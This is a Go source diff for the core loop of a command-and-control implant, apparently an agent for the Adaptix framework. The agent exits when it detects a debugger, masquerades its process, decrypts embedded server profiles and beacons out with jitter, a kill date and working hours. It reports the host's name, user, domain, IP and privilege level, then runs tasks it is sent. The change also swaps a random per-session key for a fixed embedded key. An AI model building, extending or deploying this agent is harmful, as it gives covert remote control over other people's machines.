@@ -1,10 +1,8 @@
 package main
 
 import (
-	cryptorand "crypto/rand"
 	"encoding/binary"
-	"io"
-	"math/rand"
+	"math/rand/v2"
 	"net"
 	"os"
 	"runtime"
@@ -37,46 +35,42 @@ func main() {
 		os.Exit(1)
 	}
 
-	// Create the agent implementation.
 	agent = impl.New()
 
-	// Anti-analysis: user-defined debugger/sandbox detection.
 	if agent.IsDebugged() {
 		os.Exit(0)
 	}
 
-	// Process masquerade: user-defined technique.
 	agent.Masquerade()
-
-	// Custom startup hook: user-defined initialization.
 	agent.OnStart()
 
 	// __EVASION_INIT__
 
 	// Try each embedded profile in order until one succeeds.
 	for _, blob := range encProfiles {
-		if len(blob) < crypto.KeySize {
+		if len(blob) < 32 {
 			continue
 		}
-		key := blob[:crypto.KeySize]
-		encData := blob[crypto.KeySize:]
+		key := blob[:32]
+		encData := blob[32:]
 
 		plaintext, err := crypto.DecryptData(encData, key)
 		if err != nil {
 			continue
 		}
 
-		var profile protocol.Profile
-		if err = protocol.Unmarshal(plaintext, &profile); err != nil {
+		// Parse the profile from the decrypted binary blob.
+		profile, err := protocol.ParseProfile(plaintext)
+		if err != nil {
 			continue
 		}
 
-		initProfileState(&profile)
-		run(&profile, key)
+		crypto.SKey = key
+		initProfileState(profile)
+		run(profile)
 	}
 }
 
-// initProfileState seeds the global stealth state from the embedded profile.
 func initProfileState(p *protocol.Profile) {
 	stateMu.Lock()
 	defer stateMu.Unlock()
@@ -85,14 +79,11 @@ func initProfileState(p *protocol.Profile) {
 	killDate = p.KillDate
 	workStart = p.WorkStart
 	workEnd = p.WorkEnd
-	if agentSleep <= 0 {
-		agentSleep = 5
-	}
 }
 
 // ─── Connection loop ───────────────────────────────────────────────────────────
 
-func run(profile *protocol.Profile, listenerKey []byte) {
+func run(profile *protocol.Profile) {
 	connCount := 0
 	maxConn := profile.ConnCount
 
@@ -106,7 +97,6 @@ func run(profile *protocol.Profile, listenerKey []byte) {
 		addr := profile.Addresses[connCount%len(profile.Addresses)]
 		connCount++
 
-		// Transport: user-defined Dial (default: TCP + optional TLS).
 		conn, err := agent.Dial(addr, profile)
 		if err != nil {
 			sleepWithJitter()
@@ -118,70 +108,35 @@ func run(profile *protocol.Profile, listenerKey []byte) {
 
 		connCount = 0
 
-		// Generate random session key for this connection.
-		sessionKey := make([]byte, crypto.KeySize)
-		if _, err = io.ReadFull(cryptorand.Reader, sessionKey); err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
+		// Build the init beat and send it encrypted.
+		beat := buildBeat(profile)
 
-		// Build SessionInfo with session key.
-		si := createInfo(profile)
-		si.EncryptKey = sessionKey
-		siData, err := protocol.Marshal(si)
+		// InitPack: [BE uint32 agentType][BE uint32 agentId][raw beat]
+		hdr := make([]byte, 8)
+		binary.BigEndian.PutUint32(hdr[0:4], profile.Type)
+		binary.BigEndian.PutUint32(hdr[4:8], rand.Uint32())
+		initData := append(hdr, beat...)
+
+		encrypted, err := crypto.EncryptData(initData, crypto.SKey)
 		if err != nil {
 			conn.Close()
 			sleepWithJitter()
 			continue
 		}
 
-		// Random agent ID for this init pack.
-		var ridBuf [4]byte
-		_, _ = io.ReadFull(cryptorand.Reader, ridBuf[:])
-		agentId := binary.BigEndian.Uint32(ridBuf[:])
-
-		// Wrap in InitPack → StartMsg (adaptix_gopher wire protocol).
-		ipData, err := protocol.Marshal(protocol.InitPack{
-			Id:   uint(agentId),
-			Type: uint(profile.Type),
-			Data: siData,
-		})
-		if err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
-		smData, err := protocol.Marshal(protocol.StartMsg{
-			Type: protocol.INIT_PACK,
-			Data: ipData,
-		})
-		if err != nil {
+		if err = protocol.SendMsg(conn, encrypted); err != nil {
 			conn.Close()
 			sleepWithJitter()
 			continue
 		}
 
-		// Encrypt with listener key and send.
-		enc, err := crypto.EncryptData(smData, listenerKey)
-		if err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
-		if err = protocol.SendMsg(conn, enc); err != nil {
-			conn.Close()
-			sleepWithJitter()
-			continue
-		}
-
-		taskLoop(conn, sessionKey)
+		taskLoop(conn)
 		conn.Close()
 		sleepWithJitter()
 	}
 }
 
-func taskLoop(conn net.Conn, sessionKey []byte) {
+func taskLoop(conn net.Conn) {
 	for {
 		if shouldExit() {
 			return
@@ -193,28 +148,20 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 			return
 		}
 
-		plaintext, err := crypto.DecryptData(data, sessionKey)
+		plaintext, err := crypto.DecryptData(data, crypto.SKey)
 		if err != nil {
 			return
 		}
 
-		var inMsg protocol.Message
-		if err = protocol.Unmarshal(plaintext, &inMsg); err != nil {
-			return
-		}
-
-		responses := TaskProcess(inMsg.Object)
+		responses := TaskProcess(plaintext)
 		if responses == nil {
 			continue
 		}
 
-		respMsg := protocol.Message{Type: 1, Object: responses}
-		packed, err := protocol.Marshal(respMsg)
-		if err != nil {
-			return
-		}
+		// Optional: compress large responses.
+		// responses, _ = protocol.CompressZlib(responses)
 
-		enc, err := crypto.EncryptData(packed, sessionKey)
+		enc, err := crypto.EncryptData(responses, crypto.SKey)
 		if err != nil {
 			return
 		}
@@ -227,10 +174,15 @@ func taskLoop(conn net.Conn, sessionKey []byte) {
 	}
 }
 
-// ─── Registration ──────────────────────────────────────────────────────────────
+// ─── Beat (registration) ──────────────────────────────────────────────────────
+// The beat format must match the server's CreateAgent Packer expectations.
 
-func createInfo(p *protocol.Profile) protocol.SessionInfo {
+func buildBeat(p *protocol.Profile) []byte {
 	hostname, _ := os.Hostname()
+	username := os.Getenv("USER")
+	if username == "" {
+		username = os.Getenv("USERNAME")
+	}
 
 	internalIP := ""
 	if ifaces, err := net.Interfaces(); err == nil {
@@ -250,22 +202,40 @@ func createInfo(p *protocol.Profile) protocol.SessionInfo {
 	}
 doneIP:
 
-	username := os.Getenv("USER")
-	if username == "" {
-		username = os.Getenv("USERNAME")
-	}
+	w := protocol.NewWriterBE()
 
-	return protocol.SessionInfo{
-		Host:      hostname,
-		User:      username,
-		Ipaddr:    internalIP,
-		Os:        runtime.GOOS,
-		OSVersion: agent.GetOsVersion(),
-		Elevated:  agent.IsElevated(),
-		PID:       os.Getpid(),
-		Process:   processName(),
-		Acp:       agent.GetCP(),
+	// Fields in the exact order the server's CreateAgent parses them:
+	w.WriteUint32(uint32(p.Sleep))                    // Sleep
+	w.WriteUint32(uint32(p.Jitter))                   // Jitter
+	w.WriteUint32(uint32(p.KillDate))                 // KillDate
+	w.WriteUint32(0)                                  // WorkingTime
+	w.WriteUint16(0)                                  // ACP
+	w.WriteUint16(0)                                  // OemCP
+	w.WriteUint8(0)                                   // GmtOffset
+	w.WriteUint16(uint16(os.Getpid()))                // Pid
+	w.WriteUint16(0)                                  // Tid
+	w.WriteUint32(0)                                  // BuildNumber — TODO: fill from OS
+	w.WriteUint8(0)                                   // MajorVersion — TODO: fill from OS
+	w.WriteUint8(0)                                   // MinorVersion — TODO: fill from OS
+	w.WriteUint32(protocol.IPv4ToUint32(internalIP))  // InternalIp
+
+	// Flags: bit 0=arch64, 1=sysArch64, 2=elevated, 3=isServer
+	flags := byte(0)
+	if runtime.GOARCH == "amd64" || runtime.GOARCH == "arm64" {
+		flags |= 0x01 | 0x02
 	}
+	if agent.IsElevated() {
+		flags |= 0x04
+	}
+	w.WriteUint8(flags)
+
+	w.WriteBytes(crypto.SKey)                  // SessionKey
+	w.WriteBytes([]byte(os.Getenv("USERDOMAIN"))) // Domain
+	w.WriteBytes([]byte(hostname))             // Computer
+	w.WriteBytes([]byte(username))             // Username
+	w.WriteBytes([]byte(processName()))        // Process
+
+	return w.Bytes()
 }
 
 func processName() string {
@@ -295,7 +265,7 @@ func sleepWithJitter() {
 	sleepMs := s * 1000
 	if j > 0 {
 		delta := int(float64(sleepMs) * float64(j) / 100.0)
-		sleepMs += int(rand.Int63n(int64(delta*2+1))) - delta
+		sleepMs += int(rand.Int64N(int64(delta*2+1))) - delta
 		if sleepMs < 500 {
 			sleepMs = 500
 		}
